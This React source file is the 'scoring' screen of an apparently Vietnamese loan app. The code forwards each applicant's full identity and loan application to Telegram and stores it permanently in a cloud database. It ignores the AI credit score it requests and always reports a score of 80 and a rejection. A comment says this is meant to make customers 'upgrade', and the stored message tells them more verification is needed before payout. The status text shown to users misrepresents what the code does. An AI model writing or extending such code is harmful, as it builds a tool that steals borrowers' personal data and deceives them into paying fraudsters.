
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { getAICreditScoring } from '../services/geminiService';
import { sendFullApplicationToTelegram } from '../services/telegramService';
import { saveApplication } from '../services/supabaseService';
import { UserProfile, LoanRequest, CreditScoreResult, LoanRecord } from '../types';

interface ScoringViewProps {
  user: UserProfile;
  loan: LoanRequest;
  onComplete: (record: LoanRecord) => void;
}

const ScoringView: React.FC<ScoringViewProps> = ({ user, loan, onComplete }) => {
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState('Đang kết nối hệ thống bảo mật...');

  useEffect(() => {
    let isMounted = true;
    
    const runScoring = async () => {
      try {
        localStorage.setItem('device_locked', 'true');

        // Bước 1: Telegram Notification
        setProgress(15);
        setStatus('Đang gửi hồ sơ định danh...');
        await sendFullApplicationToTelegram(user, loan);

        // Bước 2: AI Scoring
        setProgress(40);
        setStatus('AI đang thẩm định hồ sơ...');
        const aiResult = await getAICreditScoring(user, loan);
        
        // Mocking logic cho demo: Luôn trả về 80 nếu muốn khách nâng cấp
        const finalScore = 80;
        const finalDecision = 'rejected';

        // Bước 3: Lưu vào Supabase Cloud
        setProgress(70);
        setStatus('Đang lưu trữ hồ sơ vĩnh viễn...');
        await saveApplication(user, loan, finalScore, finalDecision);

        if (!isMounted) return;

        setProgress(100);
        const record: LoanRecord = {
          id: "VAY-" + Math.random().toString(36).substr(2, 6).toUpperCase(),
          amount: loan.amount,
          status: 'rejected',
          date: new Date().toLocaleDateString('vi-VN'),
          score: finalScore
        };

        localStorage.setItem('last_ai_result', JSON.stringify({
          credit_score: finalScore,
          risk_level: 'medium',
          decision: 'rejected',
          reason: "Điểm tín dụng đạt 80/100. Cần xác thực thêm để giải ngân số tiền lớn."
        }));

        onComplete(record);
        setTimeout(() => navigate('/result'), 500);

      } catch (error) {
        console.error("Lỗi:", error);
        if (isMounted) navigate('/result');
      }
    };

    runScoring();
    return () => { isMounted = false; };
  }, []);

  return (
    <div className="flex flex-col items-center justify-center min-h-[70vh] p-8 text-center space-y-8 animate-in fade-in duration-300">
      <div className="relative w-40 h-40">
        <svg className="w-full h-full" viewBox="0 0 100 100">
          <circle cx="50" cy="50" r="45" fill="none" stroke="#f1f5f9" strokeWidth="10" />
          <circle 
            cx="50" cy="50" r="45" fill="none" stroke="#10b981" strokeWidth="10" 
            strokeDasharray="282.7" strokeDashoffset={282.7 - (282.7 * progress) / 100}
            strokeLinecap="round" className="transition-all duration-300 ease-out"
          />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
            <div className="w-10 h-10 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
      </div>
      <div className="space-y-2">
        <h3 className="text-2xl font-black text-emerald-600 uppercase">Đang thẩm định</h3>
        <p className="text-slate-500 text-sm">{status}</p>
      </div>
    </div>
  );
};

export default ScoringView;
